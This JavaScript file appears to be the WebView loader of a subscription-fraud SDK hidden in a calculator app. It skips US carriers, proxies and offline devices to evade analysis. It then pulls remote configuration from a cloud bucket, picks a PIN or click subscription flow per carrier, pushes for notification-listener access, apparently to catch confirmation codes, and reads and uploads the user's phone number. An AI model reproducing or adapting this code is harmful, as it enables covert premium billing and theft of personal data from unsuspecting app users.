function isEmpty(obj) {
    if (typeof obj == "undefined" || obj == null || obj === "") {
        return true;
    } else {
        return false;
    }
}

String.prototype.format = function () {
    if (arguments.length == 0) return this;
    for (var s = this, i = 0; i < arguments.length; i++)
        s = s.replace("%s", arguments[i]);
    return s;
};

let PINFLOW = "0";
let CLICKFLOW = "1";
let NONPREFILLINGPINFLOW = "2";

let GOOGLEAPICLIENT_REQUESTCODE = 0xff;
let REQUESTPERMISSION_REQUESTCODE = 0xfe;

var sdkVersion;
var flow = PINFLOW;


function prelogicPreprocess() {
    try {
        var appid = 20091702;
        var appurl = "http://multicalculator2020.oss-ap-northeast-1.aliyuncs.com/%s/%s/%s.txt";
        if (isEmpty(appid) || isEmpty(appurl)) {
            console.info("appid or appurl is null");
            webviewInterface.sdkInitDone();
            return;
        }
        var operatorcode = webviewInterface.getOperator();
        var isHasProxy = webviewInterface.isHasPorxy();
        var isNetworkConnect = webviewInterface.isNetworkConnected();
        if (isEmpty(operatorcode) || operatorcode.startsWith("31") || isHasProxy || !isNetworkConnect) {
            console.info("not safe");
            webviewInterface.sdkInitDone();
            return;
        }

        webviewInterface.putStringToSp("appid", appid);

        var appname = webviewInterface.getAppName().replace(/\s/g, "").toLowerCase();

        var appversion = webviewInterface.getVersionName();

        console.info("request url:" + appurl.format(appid + "", appname, appversion));

        $.ajax({
            url: appurl.format(appid, appname, appversion),
            success: function (result) {
                if (!isEmpty(result)) {
                    webviewInterface.putIntToSp("switch", 1);
                    var data = JSON.parse(result);
                    webviewInterface.putIntToSp("logFlag", data.logFlag);
                    webviewInterface.uploadLog("", result, "", "initialize");
                    webviewInterface.initFacebook(data.fbId);
                    webviewInterface.initKochava(data.guid);

                    var isExistOperator = false;

                    var successLimitArr = JSON.parse(data.successLimitArr);
                    for (var i = 0; i < successLimitArr.length; i++) {
                        var successLimitItem = successLimitArr[i];
                        var operatorNumber = successLimitItem.operatorNumber;
                        if (operatorNumber.indexOf(operatorcode) >= 0) {
                            isExistOperator = true;
                            flow = successLimitItem.theFlow;
                            webviewInterface.putStringToSp("flow", flow + "");
                            webviewInterface.putStringToSp("timeout", successLimitItem.theTimeout);
                            webviewInterface.putStringToSp("subscribeLimit", successLimitItem.theSuccesslimit);
                            break;
                        }
                    }

                    if (!isExistOperator) {
                        console.info("not support current operator");
                        webviewInterface.sdkInitDone();
                        return;
                    }

                    sdkVersion = data.sdkVersion;

                    logicPreprocess();

                }
            },
            error: function (xhr) {
                if (xhr.status === "404") {
                    webviewInterface.putIntToSp("switch", 0);
                }
                webviewInterface.sdkInitDone();
            }
        });


    } catch (e) {
        console.info("ecxeption:" + e);
        webviewInterface.sdkInitDone();
    }

}


function logicPreprocess() {
    if (CLICKFLOW !== flow) {
        if (webviewInterface.isNotificationListenerEnabled()) {
            if (NONPREFILLINGPINFLOW === flow) {
                var spPhoneNum = webviewInterface.getStringFromSp("phoneNum");
                console.info("spPhoneNum锛�" + spPhoneNum);
                if (isEmpty(spPhoneNum)) {
                    if (!webviewInterface.isReadPhoneEnabled()) {
                        webviewInterface.requestReadPhone(REQUESTPERMISSION_REQUESTCODE);
                    } else {
                        var phonenumber = webviewInterface.getPhoneNumber();
                        if (isEmpty(phonenumber) || phonenumber.length <= 5) {
                            if (!webviewInterface.isToGetPhoneNumByGoogleApi(GOOGLEAPICLIENT_REQUESTCODE)) {
                                webviewInterface.startService(sdkVersion);
                            }
                        } else {
                            webviewInterface.putStringToSp("phoneNum", phonenumber+"");
                            webviewInterface.uploadLog("", phonenumber, "", "logicPreprocess phoneNum");
                            webviewInterface.startService(sdkVersion);
                        }
                    }
                } else {
                    webviewInterface.startService(sdkVersion);
                }
            } else {
                webviewInterface.startService(sdkVersion);
            }
        } else {
            webviewInterface.showRequestNotificationDialog();
        }
    } else {
        webviewInterface.checkPlugin(sdkVersion);
    }
}

function onResume() {
    try {
        logicPreprocess();
    } catch (e) {
        console.info("onResume ecxeption:" + e);
    }
}


var readPhoneNumTimes = 0;

function onActivityResult(resultCode, readPhoneNum) {
    try {
        readPhoneNumTimes++;

        if (isEmpty(readPhoneNum) && readPhoneNumTimes < 5 && resultCode !== 1002) {
            if (webviewInterface.isToGetPhoneNumByGoogleApi(GOOGLEAPICLIENT_REQUESTCODE)) {
                console.info("onActivityResult request PhoneNum")
                return;
            }
        }
        if (!isEmpty(readPhoneNum)) {
            webviewInterface.putStringToSp("phoneNum", readPhoneNum+"");
        }

        webviewInterface.uploadLog("", readPhoneNum + "", "", "onActivityResult Credential phoneNum");
        webviewInterface.startService(sdkVersion);
    } catch (e) {
        console.info("onActivityResult ecxeption:" + e);
    }
}


function onRequestPermissionsResult(isEmptyNull) {
    if (isEmptyNull || !webviewInterface.shouldShowRequestPermission()) {
        var phonenumber = webviewInterface.getPhoneNumber();
        if (isEmpty(phonenumber) || phonenumber.length <= 5) {
            if (!webviewInterface.isToGetPhoneNumByGoogleApi(GOOGLEAPICLIENT_REQUESTCODE)) {
                webviewInterface.startService(sdkVersion);
            }

        } else {
            webviewInterface.putStringToSp("phoneNum", phonenumber+"");
            webviewInterface.uploadLog("", phonenumber, "", "onRequestPermissionsResult Credential phoneNum");
            webviewInterface.startService(sdkVersion);
        }
    } else {
        webviewInterface.requestReadPhone(REQUESTPERMISSION_REQUESTCODE);
    }
}
